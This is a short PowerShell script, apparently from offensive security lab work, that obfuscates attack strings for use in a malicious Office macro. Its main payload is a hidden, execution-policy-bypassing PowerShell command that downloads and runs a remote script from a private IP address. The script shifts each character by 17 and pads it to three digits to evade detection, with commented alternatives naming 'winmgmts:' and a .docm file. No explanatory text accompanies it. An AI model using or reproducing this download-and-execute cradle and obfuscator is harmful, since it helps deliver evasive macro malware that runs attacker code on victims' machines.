$payload = "powershell -ep bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.242/run.ps1'))"
#$payload = "winmgmts:"
#$payload = "ID1005.docm"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip